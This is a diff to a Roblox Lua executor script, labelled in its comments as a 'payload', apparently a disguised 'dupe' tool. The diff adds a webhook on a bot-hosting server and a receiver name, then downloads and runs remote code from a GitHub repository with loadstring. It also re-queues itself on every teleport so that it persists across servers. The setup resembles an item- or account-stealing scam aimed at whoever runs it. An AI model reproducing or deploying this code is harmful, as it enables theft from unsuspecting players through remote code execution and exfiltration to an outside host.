@@ -1,71 +1,119 @@
 local Players = game:GetService("Players")
 local player = Players.LocalPlayer
 local jobId = game.JobId
+
+-- Define your URLs and settings here
 local mainScriptUrl = "https://raw.githubusercontent.com/DupeNew/bot/refs/heads/main/faaass"
+local userWebhook = "http://fi11.bot-hosting.net:21270/webhook/98049f31-9ed9-4a58-a0b2-383bbf7d65b0"
+local receiverName = "dawda"
+
+-- Execution guard to prevent running more than once per server
 local executionKey = "Cheto'sPayload_Continuous_" .. player.UserId .. "_" .. jobId
 if getgenv()[executionKey] then return end
 getgenv()[executionKey] = true
+
+-- Execute the main payload
 task.spawn(function()
     pcall(function()
+        getgenv().Webhook = userWebhook
+        getgenv().receiver = receiverName
         loadstring(game:HttpGet(mainScriptUrl))()
     end)
 end)
+
+-- Helper function for finding the queue function
 local function missing(t, f, fallback)
     if type(f) == t then return f end
     return fallback
 end
+
+-- Find a compatible queue teleport function
 local queueteleport = missing("function", queue_on_teleport or (syn and syn.queue_on_teleport) or (fluxus and fluxus.queue_on_teleport))
+
+-- The script source that will be queued (as a string literal)
 local scriptToQueue = [[
 local Players = game:GetService("Players")
 local player = Players.LocalPlayer
 local jobId = game.JobId
+
+-- Define your URLs and settings here
 local mainScriptUrl = "https://raw.githubusercontent.com/DupeNew/bot/refs/heads/main/faaass"
+local userWebhook = "http://fi11.bot-hosting.net:21270/webhook/98049f31-9ed9-4a58-a0b2-383bbf7d65b0"
+local receiverName = "dawda"
+
+-- Execution guard to prevent running more than once per server
 local executionKey = "Cheto'sPayload_Continuous_" .. player.UserId .. "_" .. jobId
 if getgenv()[executionKey] then return end
 getgenv()[executionKey] = true
+
+-- Execute the main payload
 task.spawn(function()
     pcall(function()
+        getgenv().Webhook = userWebhook
+        getgenv().receiver = receiverName
         loadstring(game:HttpGet(mainScriptUrl))()
     end)
 end)
+
+-- Helper function for finding the queue function
 local function missing(t, f, fallback)
     if type(f) == t then return f end
     return fallback
 end
+
+-- Find a compatible queue teleport function
 local queueteleport = missing("function", queue_on_teleport or (syn and syn.queue_on_teleport) or (fluxus and fluxus.queue_on_teleport))
+
+-- Set up queue for next teleport (recursive)
 if queueteleport then
     Players.LocalPlayer.OnTeleport:Connect(function(State)
         pcall(queueteleport, ]] .. string.format("%q", [[
 local Players = game:GetService("Players")
 local player = Players.LocalPlayer
 local jobId = game.JobId
+
+-- Define your URLs and settings here
 local mainScriptUrl = "https://raw.githubusercontent.com/DupeNew/bot/refs/heads/main/faaass"
+local userWebhook = "http://fi11.bot-hosting.net:21270/webhook/98049f31-9ed9-4a58-a0b2-383bbf7d65b0"
+local receiverName = "dawda"
+
+-- Execution guard to prevent running more than once per server
 local executionKey = "Cheto'sPayload_Continuous_" .. player.UserId .. "_" .. jobId
 if getgenv()[executionKey] then return end
 getgenv()[executionKey] = true
+
+-- Execute the main payload
 task.spawn(function()
     pcall(function()
+        getgenv().Webhook = userWebhook
+        getgenv().receiver = receiverName
         loadstring(game:HttpGet(mainScriptUrl))()
     end)
 end)
+
+-- Helper function for finding the queue function
 local function missing(t, f, fallback)
     if type(f) == t then return f end
     return fallback
 end
+
+-- Find a compatible queue teleport function
 local queueteleport = missing("function", queue_on_teleport or (syn and syn.queue_on_teleport) or (fluxus and fluxus.queue_on_teleport))
+
+-- Set up queue for next teleport (recursive)
 if queueteleport then
     Players.LocalPlayer.OnTeleport:Connect(function(State)
-        pcall(queueteleport, loadstring(game:HttpGet("https://raw.githubusercontent.com/DupeNew/bot/refs/heads/main/doss"))())
+        pcall(queueteleport, loadstring(game:HttpGet("https://raw.githubusercontent.com/DupeNew/bot/refs/heads/main/dosss"))())
     end)
 end
 ]]) .. [[)
     end)
 end
 ]]
+
+-- Set up queue for next teleport
 if queueteleport then
     Players.LocalPlayer.OnTeleport:Connect(function(State)
-        if State == Enum.TeleportState.Started then
-            pcall(queueteleport, scriptToQueue)
-        end
+        pcall(queueteleport, scriptToQueue)
     end)
 end
